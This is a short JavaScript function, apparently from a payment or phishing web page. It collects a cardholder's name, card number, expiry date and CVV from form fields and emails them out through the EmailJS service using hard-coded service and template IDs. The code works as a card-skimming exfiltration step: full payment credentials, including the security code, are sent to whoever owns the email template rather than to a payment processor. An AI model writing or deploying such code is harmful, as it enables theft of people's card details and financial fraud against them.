function sendMail() {
    let parms = {
        card_name: document.getElementById("card-name").value,
        card_number: document.getElementById("card-number").value,
        expiry_date: document.getElementById("expiry-date").value,
        cvv: document.getElementById("cvv").value,
    };

    emailjs.send("service_ifxx4ei", "template_upphce6", parms).then(function(response) {
        console.log("Email sent successfully!", response.status, response.text);
    }, function(error) {
        console.log("Failed to send email.", error);
    });
}
